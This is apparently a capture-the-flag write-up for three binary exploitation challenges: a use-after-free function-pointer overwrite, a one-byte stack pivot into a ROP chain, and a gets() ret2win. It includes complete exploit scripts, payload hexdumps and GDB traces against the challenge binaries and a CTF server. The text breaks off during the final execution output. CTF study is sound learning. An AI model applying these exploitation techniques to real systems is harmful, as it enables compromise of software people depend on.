---
title: "[CSSCTF] PWN / Binary Exploitation"
date: '2026-10-02'
description: In-depth writeups for Binary Exploitation (PWN) challenges in CSSCTF 2026, covering Use-After-Free, 1-byte Stack Pivoting, and Ret2win.
categories: [CSSCTF, Pwn]
tags: [cssctf, pwn, binary-exploitation, buffer-overflow, rop, uaf, stack-pivot]
series: [CSSCTF 2026]
showAuthor: false
showTableOfContents: true
---

# [CSSCTF] PWN / Binary Exploitation Challenges Writeup

**Author:** k0z1l  
**Category:** Binary Exploitation (PWN)  
**Flag Format:** `CSSCTF{...}`  

---

## Table of Contents
1. [Dockside Ticket Office](#1-dockside-ticket-office)
   - [1.0. TL;DR & Exploitation Summary](#10-tldr--exploitation-summary)
   - [1.1. File Information & Security Mitigations](#11-file-information--security-mitigations)
   - [1.2. Symbol Table](#12-symbol-table)
   - [1.3. Reverse Engineering & Function Analysis](#13-reverse-engineering--function-analysis)
   - [1.4. Use-After-Free Vulnerability Analysis](#14-use-after-free-vulnerability-analysis)
   - [1.5. Exploitation Primitive & Strategy](#15-exploitation-primitive--strategy)
   - [1.6. Solution Methods & Exploit Scripts](#16-solution-methods--exploit-scripts)
   - [1.7. Technical Pitfall: Stdio Buffering vs. `read(2)` Syscall](#17-technical-pitfall-stdio-buffering-vs-read2-syscall)
   - [1.8. Verification with GDB](#18-verification-with-gdb)
   - [1.9. Summary & Flag](#19-summary--flag)
2. [Maintenance Log](#2-maintenance-log)
   - [2.0. TL;DR & Exploitation Summary](#20-tldr--exploitation-summary)
   - [2.1. File Information & Security Mitigations](#21-file-information--security-mitigations)
   - [2.2. Function Map & String Analysis](#22-function-map--string-analysis)
   - [2.3. Annotated Disassembly](#23-annotated-disassembly)
   - [2.4. Stack Layout Analysis & Memory Offsets](#24-stack-layout-analysis--memory-offsets)
   - [2.5. The `leave` Instruction & 1-Byte Stack Pivot Technique](#25-the-leave-instruction--1-byte-stack-pivot-technique)
   - [2.6. Finding ROP Gadgets](#26-finding-rop-gadgets)
   - [2.7. Technical Pitfall: Why Mid-Function Jumping to `win` Fails](#27-technical-pitfall-why-mid-function-jumping-to-win-fails)
   - [2.8. Complete Exploit Script (Local & Remote)](#28-complete-exploit-script-local--remote)
   - [2.9. Verification with GDB & Execution Transcript](#29-verification-with-gdb--execution-transcript)
   - [2.10. Summary & Flag](#210-summary--flag)
3. [Kuiper Belt Relay Core](#3-kuiper-belt-relay-core)
   - [3.1. Challenge Description & Provided Assets](#31-challenge-description--provided-assets)
   - [3.2. Source Code & Vulnerability Analysis](#32-source-code--vulnerability-analysis)
   - [3.3. Stack Memory Layout & Ret2win Technique](#33-stack-memory-layout--ret2win-technique)
   - [3.4. Target Discovery Method](#34-target-discovery-method)
   - [3.5. Complete Exploit Code (Python / Pwntools)](#35-complete-exploit-code-python--pwntools)
   - [3.6. Execution Results & Flag](#36-execution-results--flag)
   - [3.7. Remediation](#37-remediation)

---

## 1. Dockside Ticket Office

> **Flag:** `CSSCTF{us3_4ft3r_fr33_d0cks1d3}`  
> **Vulnerability:** **Use-After-Free** (`free` without clearing the global pointer to NULL) $\rightarrow$ overwrite a **function pointer** in the freed struct $\rightarrow$ call `open_gate()` to print the flag.  
> **Key Characteristics:** No address leak required, no canary bypass needed, no complex tcache manipulation required: the binary is **non-PIE**, so all virtual addresses are constants.

---

### 1.0. TL;DR & Exploitation Summary

```text
1. Create ticket      -> malloc(0x28); struct *t;  t->fn = deny_access
2. Cancel ticket      -> free(t)          <-- global t is NOT set to NULL => UAF
3. Edit ticket        -> read(0, t, 0x28) <-- overwrite freed memory (UAF write)
                         payload = b'A'*0x20 + p64(0x40125f)   # fn = open_gate
4. Use ticket         -> call *(t+0x20)   ==> open_gate()  prints "CSSCTF{...}"
```

Payload sent to `Edit`: exactly **0x28 = 40 bytes**.

```text
00000000: 4141 4141 4141 4141 4141 4141 4141 4141   A...............
00000010: 4141 4141 4141 4141 4141 4141 4141 4141   ................
00000020: 5f12 4000 0000 0000                        _.@.....   <-- 0x40125f
```

---

### 1.1. File Information & Security Mitigations

```console
$ file dockside_ticket
dockside_ticket: ELF 64-bit LSB executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, not stripped
```

| Property | Value | Security Implication |
|---|---|---|
| Type | `EXEC` | **No PIE** $\rightarrow$ fixed code addresses (`0x401150`, `0x40125f`…) $\rightarrow$ hardcodable, **no leak required** |
| NX | `GNU_STACK RW` | NX enabled $\rightarrow$ shellcode injection on the stack is not executable |
| RELRO | `GNU_RELRO` without `BIND_NOW` | Partial RELRO $\rightarrow$ GOT is writable (not needed for this exploit) |
| Canary | Only in `main` (`mov rax, fs:0x28`) | Menu handlers **lack** stack canaries $\rightarrow$ irrelevant |
| Symbols | `not stripped` | Symbol names preserved (`open_gate`, `deny_access`, `active_ticket`) $\rightarrow$ rapid analysis |
| Build | `GCC 13.3.0-6ubuntu2~24.04.1` | Ubuntu 24.04 $\Rightarrow$ glibc 2.39 |

*Note on Canary:* Although `main` contains a stack canary, the flaw is **heap-based rather than stack-based**, rendering the canary irrelevant.

---

### 1.2. Symbol Table (from `readelf -sW`)

| Address | Symbol Name | Description / Role |
|---|---|---|
| `0x401236` | `deny_access` | Prints "Ticket scanned." + "Access denied…" |
| `0x40125f` | **`open_gate`** | Prints "Ticket scanned." + "Emergency harbour access granted." + **`puts(flag)`** |
| `0x401297` | `print_banner` | Displays service banner |
| `0x4012de` | `menu` | Prints command menu |
| `0x401357` | `create_ticket` | Calls `malloc(0x28)` and initializes structure |
| `0x4013c3` | `cancel_ticket` | **`free()` call without clearing pointer (root cause)** |
| `0x401408` | `edit_ticket` | **`read(0, ptr, 0x28)` — arbitrary UAF write** |
| `0x401466` | `use_ticket` | **`call *(ptr+0x20)` — indirect UAF execution** |
| `0x40149f` | `main` | Main interactive menu loop |
| `0x404068` | `active_ticket` | Global pointer holding ticket object reference |
| `0x402088` | *(rodata)* | Flag string `"CSSCTF{us3_4ft3r_fr33_d0cks1d3}"` |

---

### 1.3. Reverse Engineering & Function Analysis

#### 1.3.1. Structure `ticket`
`create_ticket` allocates `malloc(0x28)`:

```asm
40137c:  mov  edi,0x28                 ; size = 40
401381:  call malloc@plt
401386:  mov  [rip+0x2cdb],rax         ; active_ticket = t
401394:  mov  DWORD PTR [rax],0x53455547    ; "GUES"
40139a:  mov  WORD  PTR [rax+0x4],0x54      ; "T\0"
4013a7:  lea  rdx,[rip-0x17a]               ; = 0x401236 (deny_access)
4013ae:  mov  QWORD PTR [rax+0x20],rdx      ; t->fn = deny_access
```

Reconstructed C structure layout:

```c
struct ticket {                 /* malloc(0x28) -> chunk size 0x30, tcache bin 1 */
    char name[8];               /* +0x00  "GUEST\0\0\0"                          */
    /* 8 bytes uninitialized */ /* +0x08                                         */
    /* 16 bytes uninitialized*/ /* +0x10 .. +0x1f                                */
    void (*fn)(void);           /* +0x20  = &deny_access                         */
};                              /* +0x28 = total user data size                  */
struct ticket *active_ticket;   /* global pointer @ 0x404068                     */
```

Only two fields are initialized upon creation: `+0x00` (name) and `+0x20` (function pointer). The remaining intermediate bytes are uninitialized heap padding. However, because `edit_ticket` allows writing a full 40 bytes, all fields are fully controllable.

#### 1.3.2. `create_ticket` (`0x401357`)

```c
void create_ticket(void) {
    if (active_ticket) { puts("A ticket already exists."); return; }
    active_ticket = malloc(0x28);
    strcpy(active_ticket->name, "GUEST");
    active_ticket->fn = deny_access;           // 0x401236
    puts("Ticket created for GUEST.");
}
```

- **Key Takeaway:** Only a **single** ticket may be allocated at any time. Because `active_ticket` is never reset to `NULL`, `malloc` is never invoked a second time $\Rightarrow$ double-free or tcache poisoning attacks cannot be triggered $\Rightarrow$ the exploitation path must leverage the dangling pointer directly.

#### 1.3.3. `cancel_ticket` (`0x4013c3`) — The Vulnerability

```asm
4013cb:  mov rax,[rip+0x2c96]     ; rax = active_ticket
4013d2:  test rax,rax
4013d5:  jne 0x4013e8
4013d7:  lea rax,[rip+0xdae]      ; "No active ticket."
4013e1:  call puts@plt
4013e6:  jmp 0x401406
4013e8:  mov rax,[rip+0x2c79]     ; rax = active_ticket
4013ef:  mov rdi,rax
4013f2:  call free@plt            ; <-- FREE
4013f7:  lea rax,[rip+0xdae]      ; "Ticket cancelled."
401401:  call puts@plt
```

```c
void cancel_ticket(void) {
    if (!active_ticket) { puts("No active ticket."); return; }
    free(active_ticket);                 // <-- active_ticket retains dangling address
    puts("Ticket cancelled.");           //     No active_ticket = NULL; assignment exists!
}
```

- **Classic Use-After-Free:** After this function executes:
  - `active_ticket` points to a chunk that has been returned to the **0x30 tcache bin**.
  - The first 8 bytes of user data become `tcache->entries[1]` (`NULL` when the bin is empty).

#### 1.3.4. `edit_ticket` (`0x401408`)

```asm
401410:  mov  rax,[rip+0x2c51]     ; rax = active_ticket (dangling pointer)
401417:  test rax,rax
40141a:  jne  0x40142d
40141c:  ... "No active ticket."
40142d:  lea  rax,[rip+0xd8a]      ; "Enter new ticket data:"
401437:  call puts@plt
40143c:  mov  rax,[rip+0x2c25]     ; rax = active_ticket
401443:  mov  edx,0x28             ; len = 0x28
401448:  mov  rsi,rax              ; buf = active_ticket   <== WRITE TARGET
40144b:  mov  edi,0x0              ; fd = 0 (stdin)
401450:  call read@plt             ; read(0, active_ticket, 0x28)
401455:  ... "Ticket updated."
```

```c
void edit_ticket(void) {
    if (!active_ticket) { puts("No active ticket."); return; }
    puts("Enter new ticket data:");
    read(0, active_ticket, 0x28);     // <-- UAF WRITE: writes into freed chunk
    puts("Ticket updated.");
}
```

Why 0x28 bytes is ideal:
- User space spans offsets `0x00 .. 0x27`; reaching `+0x20` requires only 40 bytes $\Rightarrow$ no out-of-bounds overflow is required; the `read` call is entirely standard.
- `read` **does not append a terminating `\0`** and does not truncate on NUL bytes $\Rightarrow$ 64-bit addresses containing NUL bytes can be written intact—a capability not possible with `fgets` or `scanf("%s")`.

#### 1.3.5. `use_ticket` (`0x401466`) — Trigger

```asm
40146e:  mov  rax,[rip+0x2bf3]     ; rax = active_ticket (dangling pointer)
401475:  test rax,rax
401478:  jne  0x40148b
40147a:  ... "No active ticket."
40148b:  mov  rax,[rip+0x2bd6]     ; rax = active_ticket
401492:  mov  rdx,[rax+0x20]       ; rdx = t->fn      <== fetched from freed chunk
401496:  mov  eax,0x0
40149b:  call rdx                  ; <== INDIRECT FUNCTION CALL
```

```c
void use_ticket(void) {
    if (!active_ticket) { puts("No active ticket."); return; }
    active_ticket->fn();            // Indirect function call via heap pointer
}
```

- **Primitive:** A zero-argument function call to an **arbitrary address** supplied at offset `+0x20`.

#### 1.3.6. Win Function: `open_gate` (`0x40125f`)

```asm
40125f <open_gate>:
  puts(0x402008)   ; "Ticket scanned."
  puts(0x402060)   ; "Emergency harbour access granted."
  puts(0x402088)   ; <-- FLAG STRING in .rodata
  ret
```

**Conclusion:** Overwriting the function pointer from `deny_access` (`0x401236`) with `open_gate` (`0x40125f`) completes the exploitation chain.

---

### 1.4. Use-After-Free Vulnerability Analysis

| # | Exploitation Prerequisite | Present in Target? |
|---|---|---|
| 1 | Memory freed while reference remains usable | Yes (`cancel_ticket` fails to set `active_ticket = NULL`) |
| 2 | Arbitrary write primitive into the freed chunk | Yes (`edit_ticket` performs `read(0, ptr, 0x28)`) |
| 3 | Freed memory holds high-impact control structures | Yes (`+0x20` contains a function pointer invoked by `call`) |
| 4 | Predictable/known target address | Yes (Non-PIE executable $\Rightarrow$ `open_gate = 0x40125f` is constant) |
| 5 | Ability to write NUL bytes into memory | Yes (Raw `read(2)` syscall does not truncate on NUL) |

No information leaks (libc/heap), canary bypasses, ASLR workarounds, or ROP chains are required. The entire payload fits within 40 bytes.

---

### 1.5. Exploitation Primitive & Strategy

```text
[+] Create  -> malloc(0x28)         active_ticket = 0x406xxx (heap after .bss)
                                    [0x00]="GUEST"  [0x20]=0x401236 (deny_access)
[+] Cancel  -> free(active_ticket)  chunk enters tcache 0x30, POINTER REMAINS (UAF)
[+] Edit    -> read(0, 0x406xxx, 0x28)
                payload: 32 * 'A' + p64(0x40125f)
[+] Use     -> call *(0x406xxx+0x20) == 0x40125f == open_gate
                                    ==> "Emergency harbour access granted."
                                        CSSCTF{us3_4ft3r_fr33_d0cks1d3}
```

---

### 1.6. Solution Methods & Exploit Scripts

#### Method 1: Python Exploit Script (Local & Remote)

```python
#!/usr/bin/env python3
# Dockside Ticket Office  --  use-after-free -> open_gate()
import os, sys, struct, select, subprocess, time

BIN       = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dockside_ticket")
OPEN_GATE = 0x40125f                      # .text: puts("...granted."); puts(flag)
p64 = lambda x: struct.pack("<Q", x)
PAYLOAD = b"B" * 0x20 + p64(OPEN_GATE)    # exactly 0x28 bytes for read(0, ptr, 0x28)

class IO:
    def __init__(self, p):
        self.p = p
        os.set_blocking(p.stdout.fileno(), False)
        self.buf = b""
    def recv_until(self, needle, timeout=5.0):
        end = time.time() + timeout
        while needle not in self.buf and time.time() < end:
            r, _, _ = select.select([self.p.stdout], [], [], 0.2)
            if r:
                try: c = os.read(self.p.stdout.fileno(), 4096)
                except BlockingIOError: continue
                if not c: break
                self.buf += c
        i = self.buf.find(needle)
        if i >= 0:
            out, self.buf = self.buf[:i+len(needle)], self.buf[i+len(needle):]
        else:
            out, self.buf = self.buf, b""
        sys.stdout.write(out.decode(errors="replace")); sys.stdout.flush()
        return out
    def send(self, b):
        self.p.stdin.write(b); self.p.stdin.flush()

def main(host=None, port=None):
    if host:                                    # --- remote ---
        import socket
        s = socket.create_connection((host, port)); s.setblocking(False)
        class P:
            def __init__(s_): s_.stdin = s; s_.stdout = s
        io = IO(P())
    else:                                       # --- local ---
        p = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        io = IO(p)

    io.recv_until(b"> ")              # menu prompt
    io.send(b"1\n")                   # 1. create ticket
    io.recv_until(b"> ")
    io.send(b"2\n")                   # 2. cancel ticket -> free(), pointer dangles
    io.recv_until(b"> ")
    io.send(b"3\n")                   # 3. edit ticket
    io.recv_until(b"data:")           # await raw read(2)
    io.send(PAYLOAD)                  # overwrite fn @ +0x20 with open_gate
    io.recv_until(b"> ")
    io.send(b"4\n")                   # 4. use ticket -> call *(ptr+0x20) = open_gate()
    io.recv_until(b"granted.")
    io.recv_until(b"> ", timeout=2)
    io.send(b"5\n")

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else None
    port = int(sys.argv[2]) if len(sys.argv) > 2 else None
    main(host, port)
```

#### Method 2: Bash One-Liner

```bash
{
  echo 1; sleep 0.2
  echo 2; sleep 0.2
  echo 3; sleep 0.2
  python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*0x20+struct.pack('<Q',0x40125f))"
  sleep 0.2
  echo 4; sleep 0.3
  echo 5
} | ./dockside_ticket
```

---

### 1.7. Technical Pitfall: Stdio Buffering vs. `read(2)` Syscall

- `main` reads menu options using `__isoc99_scanf("%d", &opt)`, which relies on glibc's internal `stdio` buffering mechanism.
- The subsequent `getchar()` also reads directly from that stream buffer.
- In contrast, `edit_ticket` invokes `read(2)`—a raw kernel syscall bypassing the `FILE*` buffer entirely.

When the initial `scanf` executes, glibc reads an entire 4096-byte chunk from the pipe or socket into its user-space buffer. If all commands are streamed simultaneously into stdin:

| Input Transmission Method | Observed Behavior |
|---|---|
| Streamed in a single batch, stdin pipe remains open | The `read(2)` syscall inside `edit_ticket` blocks indefinitely $\rightarrow$ exploit hangs |
| Streamed in a single batch, stdin closed immediately (EOF) | `read(2)` returns `0` $\rightarrow$ payload is not written $\rightarrow$ menu reports `Invalid input.` |
| Interactive / Synchronized send after each prompt | Execution succeeds reliably |

**Operational Rule:** Send menu selections sequentially after verifying each prompt (`recv_until("> ")`), and transmit the 40-byte binary payload only upon matching `Enter new ticket data:`.

---

### 1.8. Verification with GDB

```console
Breakpoint 1, 0x000000000040148b in use_ticket ()
rax = 0x406020   (chunk user data)
0x406020: 0x4141414141414141  0x4141414141414141
0x406030: 0x4141414141414141  0x4141414141414141
0x406040: 0x000000000040125f  0x0000000000000301
Breakpoint 2, 0x000000000040149b in use_ticket ()
at call rdx: rdx = 0x40125f
0x000000000040125f in open_gate ()
after si: rip = 0x40125f  ==> open_gate
```

---

### 1.9. Summary & Flag

| Field | Detail |
|---|---|
| **Vulnerability** | Use-After-Free (`free` fails to NULL global reference pointer) |
| **Exploit Primitive** | 0x28-byte write into freed chunk (UAF write) + indirect call via function pointer (UAF call) |
| **Target Function** | `open_gate` (`0x40125f`) |
| **Flag** | **`CSSCTF{us3_4ft3r_fr33_d0cks1d3}`** |

---
---

## 2. Maintenance Log

> **Flag:** `CSSCTF{Duh_m4t3_1_4m_sl33py}`  
> **Server:** `nc 34.116.80.78 7312`  
> **Vulnerability:** `read(0, token, 0x21)` writes into a `0x20`-byte buffer $\rightarrow$ the 33rd byte overwrites the **least significant byte (LSB) of the caller's saved RBP** $\rightarrow$ the caller's `leave` instruction triggers a **1-byte stack pivot** directly into the report buffer (whose memory address is leaked via `printf("%p")`).  
> **Win Function:** `func_auth(0xdeadbeef, 0xcafebabe)` @ `0x401268` $\rightarrow$ `fopen("flag.txt")` $\rightarrow$ outputs the flag.  
> **Key Characteristics:** No stack canary bypass needed (the win path calls `exit()` prior to canary validation); no PIE or libc leak needed (binary is non-PIE).

---

### 2.0. TL;DR & Exploitation Summary

```text
0. Receive address leak: [*] Report buffer allocated at: 0x7fff.... -> buf
1. read#1 (0x50 bytes into buf): Place ROP chain directly inside buf
       buf+0x00: 0x00007ffc....      <- Fake RBP (writable memory address such as buf)
       buf+0x08: 0x000000000040124d  <- pop rdi ; ret
       buf+0x10: 0x00000000deadbeef  <- rdi argument
       buf+0x18: 0x000000000040124f  <- pop rsi ; ret
       buf+0x20: 0x00000000cafebabe  <- rsi argument
       buf+0x28: 0x0000000000401268  <- func_auth -> print flag
2. read#2 (0x21 bytes into token 0x20): 32 bytes padding + 1 byte = (pivot & 0xff)
3. func_tag.leave; ret -> Normal function return (return address untouched)
4. func_report.leave   -> rsp = (rbp_report & ~0xff) | pivot_byte = buf ==> STACK PIVOT
5. pop rbp; ret        -> Executes ROP chain -> func_auth(0xdeadbeef, 0xcafebabe)
6. Access Granted! Here is your flag: CSSCTF{...}
```

Sample payload structure:

```text
00000000: 20e1 ffff ff7f 0000 4d12 4000 0000 0000   .......M.@.....   <- buf (fake rbp)
00000010: efbe adde 0000 0000 4f12 4000 0000 0000   ........O.@.....   <- pop rdi / 0xdeadbeef
00000020: beba feca 0000 0000 6812 4000 0000 0000   ........h.@.....   <- pop rsi / 0xcafebabe / func_auth
00000030: 4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAA...         <- padding to 0x50
00000040: 4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAA...
00000050: 4242 4242 4242 4242 4242 4242 4242 4242   BBBBBBB...         <- read#2: token[0x20]
00000060: 4242 4242 4242 4242 4242 4242 4242 4242   BBBBBBB...
00000070: 20                                        .                  <- 33rd byte = 0x20 (pivot & 0xff)
```

---

### 2.1. File Information & Security Mitigations

```console
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
       dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
       BuildID[sha1]=5dc6c7d1..., for GNU/Linux 3.2.0, stripped
```

| Property | Value | Security Implication |
|---|---|---|
| Type | `EXEC` | **Non-PIE** $\rightarrow$ addresses `0x401268`, `0x40124d`, `0x40124f`… are static constants |
| NX | `GNU_STACK RW` | NX enabled $\rightarrow$ executable shellcode cannot be placed on the stack |
| RELRO | `GNU_RELRO`, no `BIND_NOW` | Partial RELRO (GOT is writable) |
| Canary | **Present** | Present in `main` and `func_auth`. **`func_report` and `func_tag` have no canary** |
| Symbols | `stripped` | Symbol table removed; functions identified through disassembly |

---

### 2.2. Function Map & String Analysis

| Address | Identified Name | Description / Role |
|---|---|---|
| `0x4011b6` | `setup_buffers` | `setvbuf(stdin/stdout/stderr, NULL, _IONBF, 0)` |
| `0x40139a` | **`func_report`** | Prints buffer leak, `memset(buf,0,0x50)`, `read(0, buf, 0x50)`, calls `func_tag` |
| `0x401348` | **`func_tag`** | `memset(token,0,0x20)`, sets `len = 0x21`, executes `read(0, token, 0x21)` $\rightarrow$ **1-byte overflow** |
| `0x401268` | **`func_auth`** | Validates `if (edi==0xdeadbeef && esi==0xcafebabe)` $\rightarrow$ opens and prints `flag.txt` |
| `0x401419` | `main` | Invokes `setup_buffers`, displays banner, calls `func_report`, prints "Log finalized." |

---

### 2.3. Annotated Disassembly

#### 2.3.1. `func_report` @ `0x40139a` (Address Leak Source)
```asm
40139a: push rbp
40139b: mov  rbp,rsp
40139e: sub  rsp,0x50                   ; buf = rbp-0x50 (NO stack canary)
4013b8: lea  rax,[rbp-0x50]
4013bc: mov  rsi,rax
4013c9: call printf                     ; printf("[*] Report buffer allocated at: %p\n", buf)
4013eb: mov  edx,0x50
4013f8: call read                       ; read(0, buf, 0x50) (80 bytes)
401402: call 0x401348                   ; func_tag()
401417: leave
401418: ret                             ; <== Stack pivot executed here
```

#### 2.3.2. `func_tag` @ `0x401348` (1-Byte Off-by-One Overflow)
```asm
401348: push rbp
401349: mov  rbp,rsp
40134c: sub  rsp,0x30
401350: lea  rax,[rbp-0x20]             ; token = rbp-0x20 (32-byte buffer)
40137a: mov  QWORD PTR [rbp-0x28],0x21  ; len = 0x21 = 33 (buffer is only 32 bytes)
401382: mov  rdx,[rbp-0x28]
401392: call read                       ; read(0, token, 33) => byte 33 overwrites saved RBP LSB!
401398: leave ; ret
```

#### 2.3.3. `func_auth` @ `0x401268` (Win Target)
```asm
401285: cmp DWORD PTR [rbp-0x64],0xdeadbeef ; Validate argument 1 (rdi)
401292: cmp DWORD PTR [rbp-0x68],0xcafebabe ; Validate argument 2 (rsi)
4012c2: call fopen                      ; fopen("flag.txt", "r")
4012fb: call fgets                      ; Read flag into buffer
401307: call puts                       ; Print flag to stdout
40131d: call exit                       ; exit(0) - stack canary check bypassed!
```

---

### 2.4. Stack Layout Analysis & Memory Offsets

| Variable / Pointer | Calculation / Relative Offset |
|---|---|
| `buf` | Leaked directly via `printf` |
| `rbp_report` | `buf + 0x50` |
| `rbp_tag` | `rbp_report - 0x60` |
| `token` | `rbp_report - 0x80` (32 bytes) |
| Byte 33 of `read#2` | Overwrites the least significant byte of `rbp_report` |

---

### 2.5. The `leave` Instruction & 1-Byte Stack Pivot Technique

When `func_report` executes its epilogue `leave`:
```asm
mov rsp, rbp      ; rsp = (rbp_report & ~0xff) | our_byte   <== STACK PIVOT
pop rbp           ; rbp = [rsp], rsp += 8
ret               ; rip = [rsp] (Executes pivoted ROP chain)
```

By computing `pivot = max(buf, block_base)`, the ROP chain is placed at the exact corresponding offset inside `buf`.

---

### 2.6. Finding ROP Gadgets

Two standard gadgets were identified in `.text`:
- `0x40124d`: `pop rdi ; ret` $\rightarrow$ populates `0xdeadbeef`
- `0x40124f`: `pop rsi ; ret` $\rightarrow$ populates `0xcafebabe`

---

### 2.7. Technical Pitfall: Why Mid-Function Jumping to `win` Fails

Attempting to jump directly to `0x40129f` (bypassing the `deadbeef` and `cafebabe` checks):
- Skips the crucial instruction `mov QWORD PTR [rbp-0x58], rax` (which stores the opened `FILE*` pointer).
- As a consequence, `fgets` attempts to read using an uninitialized pointer from `[rbp-0x58]` $\rightarrow$ **immediate SIGSEGV crash**.
- **Lesson:** Execution must start at the entry point of `func_auth` (`0x401268`), properly configuring registers `rdi` and `rsi`.

---

### 2.8. Complete Exploit Script (Local & Remote)

```python
#!/usr/bin/env python3
# CSSCTF "Maintenance Log" Exploit
import os, sys, struct, socket

POP_RDI = 0x40124d
POP_RSI = 0x40124f
AUTH    = 0x401268
BUF_OFF = 0x50
CHAIN_LEN = 48
HOST, PORT = "34.116.80.78", 7312

def build(buf):
    rbp_report = buf + BUF_OFF
    pivot = max(buf, rbp_report & ~0xff)
    if buf + BUF_OFF - pivot < CHAIN_LEN:
        return None
    chain  = struct.pack("<Q", buf)           # Fake RBP
    chain += struct.pack("<Q", POP_RDI)
    chain += struct.pack("<Q", 0xdeadbeef)
    chain += struct.pack("<Q", POP_RSI)
    chain += struct.pack("<Q", 0xcafebabe)
    chain += struct.pack("<Q", AUTH)
    p1 = bytearray(b"A" * BUF_OFF)
    p1[pivot - buf:pivot - buf + CHAIN_LEN] = chain
    p2 = b"B" * 0x20 + bytes([pivot & 0xff])
    return bytes(p1), p2, pivot

def main():
    while True:
        s = socket.create_connection((HOST, PORT))
        data = s.recv(1024).decode()
        addr_str = data.split("allocated at: ")[1].split("\n")[0]
        buf = int(addr_str, 16)
        res = build(buf)
        if not res:
            s.close()
            continue
        p1, p2, pivot = res
        s.sendall(p1)
        s.sendall(p2)
        resp = s.recv(4096).decode(errors="replace")
        print(resp)
        s.close()
        break

if __name__ == "__main__":
    main()
```

---

### 2.9. Verification with GDB & Execution Transcript

```console
Breakpoint 2, 0x0000000000401417 in ?? ()
0x7fffffffe120:	0x00007fffffffe120	0x000000000040124d
0x7fffffffe130:	0x00000000deadbeef	0x000000000040124f
0x7fffffffe140:	0x00000000cafebabe	0x0000000000401268

[3] after leave: rsp=0x7fffffffe128  rbp(new)=0x7fffffffe120
[4] after ret : rip=0x40124d  (pop rdi;ret)
[+] Access Granted! Here is your flag:
CSSCTF{Duh_m4t3_1_4m_sl33py}
```

---

### 2.10. Summary & Flag

| Property | Detail |
|---|---|
| **Vulnerability** | Off-by-one single-byte overwrite on caller's saved RBP LSB |
| **Information Leak** | Stack memory address leaked via `printf("%p")` |
| **Exploitation Technique** | 1-byte stack pivot via `leave` + two-argument ROP invocation |
| **Flag** | **`CSSCTF{Duh_m4t3_1_4m_sl33py}`** |

---
---

## 3. Kuiper Belt Relay Core

> **Flag:** `CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}`  
> **Server:** `nc 34.116.80.78 9998` · Provided file: `echo.c`  
> **Vulnerability:** Classic Stack Buffer Overflow via the unsafe `gets(buffer)` function.  
> **Win Mechanism:** Redirect execution flow (ret2win) directly to the unreferenced `win()` function @ `0x401216`.

---

### 3.1. Challenge Description & Provided Assets

> **Description:**  
> *The Relay rebooted an old diagnostic process — it just echoes back whatever you send it. Simple by design.*  
> *But it's still carrying dead code from before the blackout: a function that's never called, sitting untouched in memory. Redirect the program into it.*  
>  
> **Provided File:** `echo.c`  
> **Remote Connection:** `nc 34.116.80.78 9998`  
> **Flag Format:** `CSSCTF{...}`

---

### 3.2. Source Code & Vulnerability Analysis

The provided C source file (`echo.c`):

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("\nYou hijacked the return address!\n");
    printf("Here's your flag:\n");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Error: flag.txt not found on server.\n");
        exit(1);
    }
    char flag[128];
    if (fgets(flag, sizeof(flag), f)) {
        printf("%s\n", flag);
    }
    fclose(f);
    exit(0);
}

void vuln() {
    char buffer[64];
    printf("This program is a simple echo service.\n");
    printf("Enter your message: ");
    gets(buffer);  // VULNERABLE: no bounds checking!
    printf("You said: %s\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    printf("Goodbye!\n");
    return 0;
}
```

1. **Dead Code: `win()`:**
   - Reads `flag.txt` and outputs the flag content to `stdout`.
   - Never called during standard execution flow.

2. **Buffer Overflow in `vuln()`:**
   - Allocates a stack array: `char buffer[64];` (64 bytes).
   - `gets(buffer)` performs no boundary checking, reading arbitrary input until encountering `\n` or `EOF`.
   - Sending more than 64 bytes overflows `buffer`, corrupting `Saved RBP` and the `Return Address`.

---

### 3.3. Stack Memory Layout & Ret2win Technique

The x86_64 stack frame layout for `vuln()`:

```text
Low Memory
┌──────────────────────────────────────────┐  <-- $rsp (Top of Stack)
│  buffer[0..63]                           │
│  (Input storage buffer: 64 bytes)        │
├──────────────────────────────────────────┤  <-- $rbp (Frame Pointer)
│  Saved RBP                               │
│  (Caller base pointer: 8 bytes)          │
├──────────────────────────────────────────┤  <-- $rbp + 0x8
│  Saved RIP / Return Address              │
│  (Return target after vuln() epilogue)   │
└──────────────────────────────────────────┘
High Memory
```

- Offset from `buffer` start to `Return Address` = `64 + 8 = 72 bytes`.
- Overwriting the `Return Address` with the address of `win()` diverts CPU control to `win()` immediately upon executing `ret`.

---

### 3.4. Target Discovery Method

Only `echo.c` was provided without a compiled binary.
- With PIE disabled, binary code resides within standard addresses `0x401000 - 0x402000`.
- Because `win()` is the first defined function in the file, it sits near the base of the user code segment.
- An automated scan across 16-byte aligned addresses in range `0x401100 - 0x401250` was executed:
  - Address **`0x401216`** successfully responded with the hijacked return notice and printed the flag.

---

### 3.5. Complete Exploit Code (Python / Pwntools)

```python
#!/usr/bin/env python3
"""
Challenge: Kuiper Belt Relay Core (PWN)
Exploit Technique: ret2win (Buffer Overflow via gets)
Architecture: Linux x86_64
"""

from pwn import *

HOST = "34.116.80.78"
PORT = 9998
OFFSET = 72            # 64 bytes buffer + 8 bytes saved RBP
WIN_ADDR = 0x401216    # Address of win() on target server

def solve():
    log.info(f"Connecting to {HOST}:{PORT}...")
    r = remote(HOST, PORT)

    r.recvuntil(b"Enter your message: ")

    payload = b"A" * OFFSET + p64(WIN_ADDR)
    
    log.info(f"Sending payload ({len(payload)} bytes) -> win() @ {hex(WIN_ADDR)}")
    r.sendline(payload)

    response = r.recvall(timeout=3).decode(errors="replace")
    log.success("Response received from target:")
    print(response)

if __name__ == "__main__":
    solve()
```

---

### 3.6. Execution Results & Flag

```text
[+] Opening connection to 34.116.80.78 on port 9998: Done
[*] Sending payload (80 bytes) -> win() @ 0x401216
